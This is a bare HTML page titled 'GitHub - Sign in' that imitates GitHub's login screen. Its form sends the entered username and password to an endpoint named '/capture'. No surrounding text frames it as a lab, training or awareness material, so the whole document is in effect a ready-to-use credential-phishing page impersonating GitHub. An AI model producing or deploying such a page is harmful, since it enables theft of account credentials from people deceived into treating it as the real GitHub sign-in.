<!DOCTYPE html>
<html>
<head><title>GitHub - Sign in</title></head>
<body>
<div style="width:300px;margin:100px auto;">
<h2>GitHub</h2>
<form method="POST" action="/capture">
<input type="text" name="login" placeholder="Username or email address" style="width:100%;padding:8px;margin:5px 0;"><br>
<input type="password" name="password" placeholder="Password" style="width:100%;padding:8px;margin:5px 0;"><br>
<button type="submit" style="width:100%;padding:8px;">Sign in</button>
</form>
</div>
</body>
</html>
